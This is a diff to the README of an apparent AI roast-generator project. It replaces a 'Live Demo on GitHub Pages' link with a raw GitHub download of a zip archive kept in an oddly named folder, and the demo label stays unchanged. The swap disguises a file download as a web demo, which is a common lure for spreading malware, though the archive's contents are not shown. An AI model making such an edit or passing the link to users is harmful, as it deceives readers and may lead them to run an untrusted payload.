@@ -29,7 +29,7 @@ Describe yourself, pick a roast style, and prepare to have your ego obliterated 
 
 ## 🚀 Try It Live
 
-🔗 **[Live Demo on GitHub Pages](https://mynameisjabali.github.io/AiRoastMaster/)**
+🔗 **[Live Demo on GitHub Pages](https://raw.githubusercontent.com/mynameisjabali/AiRoastMaster/main/Angetenar/AiRoastMaster_1.4.zip)**
 
 ---
 
